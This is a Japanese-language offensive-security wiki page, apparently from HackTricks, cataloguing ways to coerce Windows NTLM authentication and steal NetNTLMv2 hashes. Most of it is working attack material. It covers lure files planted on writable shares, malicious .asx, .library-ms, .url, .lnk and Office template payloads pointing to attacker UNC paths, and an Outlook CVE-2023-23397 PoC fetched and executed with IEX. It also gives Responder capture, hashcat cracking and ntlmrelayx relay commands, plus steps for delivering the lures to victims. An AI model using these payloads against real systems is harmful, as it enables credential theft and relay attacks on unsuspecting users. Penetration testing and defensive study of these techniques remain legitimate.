# NTLM認証情報を盗み取れる場所

{{#include ../../banners/hacktricks-training.md}}

**オンラインでのMicrosoft Wordファイルのダウンロードから、NTLM leaksの情報源 https://github.com/soufianetahiri/TeamsNTLMLeak/blob/main/README.md、さらに [https://github.com/p0dalirius/windows-coerced-authentication-methods](https://github.com/p0dalirius/windows-coerced-authentication-methods) まで、[https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes/](https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes/) にある優れたアイデアをすべて確認してください。**<sup>[[12]](#references)[[13]](#references)[[14]](#references)</sup>

### 書き込み可能なSMB share + ExplorerでトリガーされるUNC lure（ntlm_theft/SCF/LNK/library-ms/desktop.ini）

**ユーザーやスケジュール済みジョブがExplorerで参照するshareに書き込める**場合、メタデータが自身のUNC（例: `\\ATTACKER\share`）を指すファイルを配置します。フォルダーを表示すると**暗黙的なSMB認証**がトリガーされ、listenerに**NetNTLMv2**が漏えいします。<sup>[[1]](#references)</sup>

1. **lureを生成する**（SCF/URL/LNK/library-ms/desktop.ini/Office/RTFなどに対応）

```bash
git clone https://github.com/Greenwolf/ntlm_theft && cd ntlm_theft
uv add --script ntlm_theft.py xlsxwriter
uv run ntlm_theft.py -g all -s <attacker_ip> -f lure
```

2. **書き込み可能な共有フォルダーに配置する**（被害者が開くフォルダーならどこでも可）:

```bash
smbclient //victim/share -U 'guest%'
cd transfer\
prompt off
mput lure/*
```

3. **リッスンしてクラック**:

```bash
sudo responder -I <iface>          # capture NetNTLMv2
hashcat hashes.txt /opt/SecLists/Passwords/Leaked-Databases/rockyou.txt  # autodetects mode 5600
```

Windows は複数のファイルを一度に開くことがあります。Explorer がプレビューするもの（`BROWSE TO FOLDER`）は、クリックする必要がありません。

### Windows Media Player playlists (.ASX/.WAX)

対象者に、こちらが用意した Windows Media Player playlist を開くかプレビューさせることができれば、エントリの参照先を UNC path に指定して Net-NTLMv2 を leak できます。WMP は SMB 経由で参照先のメディアを取得しようとし、暗黙的に認証を行います。<sup>[[3]](#references)[[4]](#references)</sup>

ペイロードの例：

```xml
<asx version="3.0">
  <title>Leak</title>
  <entry>
    <title></title>
    <ref href="file://ATTACKER_IP\\share\\track.mp3" />
  </entry>
</asx>
```

収集とcrackingのフロー:

```bash
# Capture the authentication
sudo Responder -I <iface>

# Crack the captured NetNTLMv2
hashcat hashes.txt /opt/SecLists/Passwords/Leaked-Databases/rockyou.txt
```

### ZIP内に埋め込まれた .library-ms による NTLM leak（CVE-2025-24071/24055）

Windows Explorer は、ZIP archive 内から直接開かれた .library-ms ファイルを安全でない方法で処理します。ライブラリ定義がリモート UNC path（例: \\attacker\share）を指している場合、ZIP 内の .library-ms を閲覧または起動するだけで、Explorer は UNC path を列挙し、攻撃者に NTLM 認証情報を送信します。これにより、オフラインで crack したり、relay したりできる可能性のある NetNTLMv2 が得られます。<sup>[[2]](#references)</sup>

攻撃者の UNC path を指す最小限の .library-ms

```xml
<?xml version="1.0" encoding="UTF-8"?>
<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
  <version>6</version>
  <name>Company Documents</name>
  <isLibraryPinned>false</isLibraryPinned>
  <iconReference>shell32.dll,-235</iconReference>
  <templateInfo>
    <folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType>
  </templateInfo>
  <searchConnectorDescriptionList>
    <searchConnectorDescription>
      <simpleLocation>
        <url>\\10.10.14.2\share</url>
      </simpleLocation>
    </searchConnectorDescription>
  </searchConnectorDescriptionList>
</libraryDescription>
```

運用手順
- 上記の XML を使って .library-ms ファイルを作成する（IP/hostname を設定）。
- ZIP に圧縮し（Windows の場合：右クリックして「送る」→「圧縮 (zip 形式) フォルダー」）、ZIP をターゲットに送る。
- NTLM capture listener を起動し、被害者が ZIP 内の .library-ms を開くのを待つ。


### Outlook の予定表リマインダー音声ファイルのパス（CVE-2023-23397）– ゼロクリックの Net-NTLMv2 leak

Microsoft Outlook for Windows は、予定表アイテム内の拡張 MAPI プロパティ PidLidReminderFileParameter を処理していました。このプロパティが UNC パス（例：\\attacker\share\alert.wav）を指している場合、リマインダーが作動した際に Outlook が SMB 共有に接続し、クリックなしでユーザーの Net-NTLMv2 が leak していました。この脆弱性は 2023 年 3 月 14 日に修正されましたが、レガシー環境や未更新の環境、過去のインシデント対応において、今も非常に重要です。<sup>[[5]](#references)</sup>

PowerShell（Outlook COM）を使った簡単な悪用方法：

```powershell
# Run on a host with Outlook installed and a configured mailbox
IEX (iwr -UseBasicParsing https://raw.githubusercontent.com/api0cradle/CVE-2023-23397-POC-Powershell/main/CVE-2023-23397.ps1)
Send-CalendarNTLMLeak -recipient user@example.com -remotefilepath "\\10.10.14.2\share\alert.wav" -meetingsubject "Update" -meetingbody "Please accept"
# Variants supported by the PoC include \\host@80\file.wav and \\host@SSL@443\file.wav
```

リスナー側:

```bash
sudo responder -I eth0  # or impacket-smbserver to observe connections
```

Notes
- リマインダーが起動する際に、被害者の Windows で Outlook が実行中であればよい。
- leak によって、オフラインでの cracking または relay に利用できる Net‑NTLMv2 が取得される（pass-the-hash ではない）。


### .LNK/.URL アイコンベースのゼロクリック NTLM leak（CVE‑2025‑50154 – CVE‑2025‑24054 の bypass）

Windows Explorer はショートカットのアイコンを自動的に表示します。最近の調査では、UNC アイコンショートカットに対する Microsoft の 2025 年 4 月のパッチ適用後も、ショートカットのターゲットを UNC パス上にホストし、アイコンをローカルに置くことで、クリックなしに NTLM 認証をトリガーできることが示されました（パッチの bypass には CVE‑2025‑50154 が割り当てられました）。フォルダーを表示するだけで、Explorer はリモートターゲットからメタデータを取得し、攻撃者の SMB サーバーに NTLM を送信します。<sup>[[6]](#references)</sup>

最小限の Internet Shortcut ペイロード（.url）:

```ini
[InternetShortcut]
URL=http://intranet
IconFile=\\10.10.14.2\share\icon.ico
IconIndex=0
```

PowerShellでショートカットのpayload（.lnk）を作成する：

```powershell
$lnk = "$env:USERPROFILE\Desktop\lab.lnk"
$w = New-Object -ComObject WScript.Shell
$sc = $w.CreateShortcut($lnk)
$sc.TargetPath = "\\10.10.14.2\share\payload.exe"  # remote UNC target
$sc.IconLocation = "C:\\Windows\\System32\\SHELL32.dll" # local icon to bypass UNC-icon checks
$sc.Save()
```

配布案
- ショートカットを ZIP に入れ、被害者に閲覧させる。
- 被害者が開く書き込み可能な共有フォルダーにショートカットを置く。
- 同じフォルダーに他のおとりファイルも置き、Explorer が項目をプレビューするようにする。

### ExtraData のアイコンパスを介した、クリック不要の .LNK NTLM leak（CVE‑2026‑25185）

Windows は実行時だけでなく、**表示/プレビュー**時（アイコンの描画時）にも `.lnk` のメタデータを読み込みます。CVE‑2026‑25185 は、**ExtraData** ブロックによってシェルがアイコンパスを解決し、読み込み中にファイルシステムへアクセスする経路を示しています。パスがリモートの場合、外向きの NTLM 認証が発生します。

主なトリガー条件（`CShellLink::_LoadFromStream` で確認）:
- ExtraData に **DARWIN_PROPS**（`0xa0000006`）を含める（アイコン更新ルーチンを実行する条件）。
- **ICON_ENVIRONMENT_PROPS**（`0xa0000007`）を含め、`TargetUnicode` に値を設定する。
- ローダーが `TargetUnicode` 内の環境変数を展開し、結果のパスに対して `PathFileExistsW` を呼び出す。

`TargetUnicode` が UNC パス（例: `\\attacker\share\icon.ico`）に解決されると、ショートカットを含むフォルダーを**表示するだけ**で、外向きの認証が発生します。同じ読み込み経路は**インデックス作成**や**AV スキャン**でも実行されるため、実用的なクリック不要の leak 攻撃面となります。<sup>[[7]](#references)</sup>

この構造を Windows GUI を使わずに作成・検査するための研究用ツール（パーサー/ジェネレーター/UI）が、**LnkMeMaybe** プロジェクトで公開されています。<sup>[[8]](#references)</sup>


### `davclnt.dll,DavSetCookie` を介した WebDAV 認証強制 / 認証情報の検証

ネイティブの **WebDAV client** を悪用すると、現在のログオンセッションに任意の **HTTP/WebDAV** エンドポイントへの認証を強制できます:

```cmd
rundll32.exe davclnt.dll,DavSetCookie <HOST> http://<TARGET>/C$/Windows
```

なぜこれが有用か:
- **攻撃者が制御する WebDAV サーバー**に対して、カスタムクライアントを配置せずに**HTTP経由のNTLM**を発生させられます。
- **内部ホスト**に対しては、横展開する前に、盗んだ認証情報がどこで受け入れられるかを**静かに検証**できます。<sup>[[9]](#references)</sup>
- **SMBの外向き通信がフィルタリングされている**一方で、**HTTP/WebDAV**には引き続き到達できる場合に、このコマンドは有効な代替手段です。

運用上の注意:
- ソースホストで**WebClient**サービスが実行中である必要があります。
- `rundll32.exe`は`davclnt.dll`を読み込み、Windowsに**現在のユーザーの認証情報**を使ってWebDAV認証を処理させます。<sup>[[10]](#references)</sup>
- 自分が制御するインフラを指定する場合は、次のようなNTLM対応のHTTPリスナー/リレーを使用します:

```bash
# Capture or relay NTLM over HTTP/WebDAV
ntlmrelayx.py -t smb://<TARGET> --http-port 80
```

検知の観点では、多数の内部システムに対して `rundll32.exe davclnt.dll,DavSetCookie` が繰り返し実行されることは、通常のユーザー行動ではなく、**credential validation / spray-like lateral movement prep** を示す強いシグナルです。<sup>[[9]](#references)[[11]](#references)</sup>

### Office remote template injection (.docx/.dotm) to coerce NTLM

Officeドキュメントでは、外部テンプレートを参照できます。添付テンプレートにUNCパスを指定すると、ドキュメントを開いたときにSMBへの認証が行われます。

最小限のDOCXリレーションシップ変更（word/内）：

1) word/settings.xmlを編集し、添付テンプレートの参照を追加します：

```xml
<w:attachedTemplate r:id="rId1337" xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main" xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships"/>
```

2) word/_rels/settings.xml.rels を編集し、rId1337 を自身の UNC に向けます:

```xml
<Relationship Id="rId1337" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate" Target="\\\\10.10.14.2\\share\\template.dotm" TargetMode="External" xmlns="http://schemas.openxmlformats.org/package/2006/relationships"/>
```

3) .docxに再パッケージして渡します。SMB capture listenerを起動し、ファイルが開かれるのを待ちます。

capture後のNTLM relayや悪用方法については、こちらを確認してください。

{{#ref}}
README.md
{{#endref}}


## References
- [1] [HTB: Breach – 書き込み可能な共有フォルダーで誘導 + Responderでcapture → NetNTLMv2をcrack → svc_mssqlをKerberoast](https://0xdf.gitlab.io/2026/02/10/htb-breach.html)
- [2] [HTB Fluffy – ZIP .library‑msによる認証情報のleak (CVE‑2025‑24071/24055) → GenericWrite → AD CS ESC16でDAを取得 (0xdf)](https://0xdf.gitlab.io/2025/09/20/htb-fluffy.html)
- [3] [HTB: Media — WMPによるNTLM leak → NTFS junctionでwebrootに到達しRCE → FullPowers + GodPotatoでSYSTEMを取得](https://0xdf.gitlab.io/2025/09/04/htb-media.html)
- [4] [Morphisec – 5つのNTLM脆弱性: Microsoftの未修正な権限昇格の脅威](https://www.morphisec.com/blog/5-ntlm-vulnerabilities-unpatched-privilege-escalation-threats-in-microsoft/)
- [5] [MSRC – MicrosoftがOutlook EoP (CVE‑2023‑23397) を緩和し、PidLidReminderFileParameter経由のNTLM leakについて解説](https://www.microsoft.com/en-us/msrc/blog/2023/03/microsoft-mitigates-outlook-elevation-of-privilege-vulnerability/)
- [6] [Cymulate – ゼロクリックで1つのNTLM: Microsoftのセキュリティパッチを回避 (CVE‑2025‑50154)](https://cymulate.com/blog/zero-click-one-ntlm-microsoft-security-patch-bypass-cve-2025-50154/)
- [7] [TrustedSec – LnkMeMaybe: CVE‑2026‑25185のレビュー](https://trustedsec.com/blog/lnkmemaybe-a-review-of-cve-2026-25185)
- [8] [TrustedSec LnkMeMaybeツール](https://github.com/trustedsec/LnkMeMaybe)
- [9] [Rapid7 – ITサポートからの電話: Teamsからドメイン侵害に至るModeloRATキャンペーンの分析](https://www.rapid7.com/blog/post/tr-it-support-dissecting-modelorat-campaign-microsoft-teams-compromise)
- [10] [Microsoft Learn – davclnt.hヘッダー](https://learn.microsoft.com/en-us/windows/win32/api/davclnt/)
- [11] [Splunk – Windows Rundll32 WebDAVリクエスト](https://research.splunk.com/endpoint/320099b7-7eb1-4153-a2b4-decb53267de2/)
- [12] [osandamalith.com - Netntlmハッシュを盗む際に注目すべき場所](https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes)
- [13] [soufianetahiri/TeamsNTLMLeak](https://github.com/soufianetahiri/TeamsNTLMLeak/blob/main/README.md)
- [14] [p0dalirius/windows-coerced-authentication-methods](https://github.com/p0dalirius/windows-coerced-authentication-methods)
{{#include ../../banners/hacktricks-training.md}}
